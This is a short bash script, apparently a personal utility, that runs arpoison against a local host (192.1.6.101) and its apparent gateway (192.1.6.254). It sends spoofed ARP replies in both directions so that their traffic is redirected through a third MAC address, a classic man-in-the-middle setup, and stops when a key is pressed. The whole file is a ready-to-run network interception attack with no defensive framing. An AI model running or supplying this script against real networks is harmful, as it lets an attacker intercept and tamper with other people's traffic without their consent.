#!/bin/bash - 
#===============================================================================
#
#          FILE: trick.sh
# 
#         USAGE: ./trick.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: kk (Kingkong Mok), kingkongmok AT gmail DOT com
#  ORGANIZATION: 
#       CREATED: 08/06/2013 10:50:32 AM CST
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error


sudo arpoison -i eth0 -d 192.1.6.101 -s 192.1.6.254 -t 6c:3b:e5:27:d6:ab -r 00:80:48:27:05:0e -w 5  > /dev/null &
sudo arpoison -i eth0 -d 192.1.6.254 -s 192.1.6.101 -t 3c:e5:a6:d6:1d:61 -r 00:80:48:27:05:0e -w 5 > /dev/null &

echo 'Waiting for a key press...'
read -n1 -s

sudo pkill arpoison

